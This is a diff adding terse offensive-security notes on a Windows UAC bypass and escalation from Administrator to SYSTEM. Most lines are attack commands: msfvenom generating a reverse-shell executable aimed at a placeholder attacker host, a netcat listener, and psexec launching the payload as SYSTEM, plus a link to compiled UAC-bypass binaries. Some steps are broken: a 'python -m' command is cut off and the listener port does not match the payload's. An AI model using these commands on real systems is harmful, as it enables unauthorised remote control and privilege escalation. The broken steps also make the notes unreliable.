@@ -1,1 +1,15 @@
+------------------------UAC Bypass ------------------------
+UAC is not a security feature but that acts as a boundary when users want to perform privileged operations.
 
+From Administrator to System:
+
+> net user user                                      ----> to view users privileges and his group
+# msfvenom –p windows/shell_reverse_tcp LHOST=IP LPORT=443 –f exe > reverse.exe
+# chmod +x reverse.exe
+# python -m
+
+# nc –lvp 4444
+
+> psexec.exe –i –d –accepteula –s  reverse.exe
+
+https://github.com/dotfornet/UACME/tree/master/Compiled
